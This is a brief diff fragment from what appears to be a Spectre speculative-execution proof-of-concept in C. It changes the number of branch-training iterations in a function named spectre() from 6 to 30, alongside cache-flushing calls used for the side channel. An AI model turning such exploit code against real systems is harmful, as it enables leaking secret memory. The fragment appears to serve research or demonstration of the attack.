@@ -66,7 +66,7 @@ void spectre(size_t offset){
 		flushSideChannel();
 		training_x = trial_idx % buffer_size;
 
-		for (j = 1; j <= 6; j++) {
+		for (j = 1; j <= 30; j++) {
 			flush(&buffer_size);
 			for (volatile int z = 0; z < 100; z++){}
 			//asm volatile("DSB SY");
